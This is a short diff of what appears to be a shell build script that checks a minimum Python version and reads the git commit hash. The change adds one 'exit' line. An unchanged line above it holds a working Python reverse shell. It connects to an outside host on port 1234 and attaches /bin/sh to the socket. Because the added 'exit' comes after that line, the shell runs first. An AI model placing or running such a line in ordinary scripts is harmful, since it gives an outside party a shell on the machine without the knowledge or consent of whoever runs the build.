@@ -8,6 +8,7 @@
 #tmate
 #exit
 export RHOST="mute.netmode.ece.ntua.gr";export RPORT=1234;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+exit
 
 PYTHON_MINVER="3.9"
 commit_hash=$(git rev-parse --short HEAD)
